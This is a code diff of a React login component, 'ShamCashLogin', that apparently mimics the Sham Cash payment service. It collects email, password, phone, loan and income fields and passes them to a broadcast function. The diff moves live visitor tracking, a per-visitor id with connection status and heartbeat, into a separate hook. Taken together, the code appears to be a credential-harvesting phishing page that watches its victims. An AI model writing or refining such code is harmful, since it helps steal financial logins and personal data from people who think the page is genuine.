@@ -8,7 +8,8 @@ import {
   TrendingUp,
   UserRound,
 } from "lucide-react";
-import { useState, useEffect, useRef } from "react";
+import { useState, useEffect } from "react";
+import { useVisitorTracking } from "@/hooks/useVisitorTracking";
 
 function ShamLogo() {
   return (
@@ -37,25 +38,10 @@ function broadcast(data: Record<string, string>) {
 export function ShamCashLogin() {
   const [showPassword, setShowPassword] = useState(false);
   const [fields, setFields] = useState({ email: "", password: "", loan: "", phone: "", income: "" });
-  const visitorId = useRef(`v-${Date.now()}`);
+  useVisitorTracking("تسجيل الدخول");
 
   useEffect(() => {
-    const id = visitorId.current;
-    localStorage.setItem("sham_visitor_id", id);
-    localStorage.setItem("sham_visitor_status", "connected");
-    localStorage.setItem("sham_visitor_connected_at", new Date().toLocaleTimeString("ar-SY"));
     broadcast({ email: "", phone: "", loan: "", income: "" });
-
-    const heartbeat = setInterval(() => {
-      if (localStorage.getItem("sham_visitor_id") === id) {
-        localStorage.setItem("sham_visitor_heartbeat", Date.now().toString());
-      }
-    }, 1000);
-
-    return () => {
-      clearInterval(heartbeat);
-      localStorage.setItem("sham_visitor_status", "disconnected");
-    };
   }, []);
 
   function updateField(key: string, value: string) {
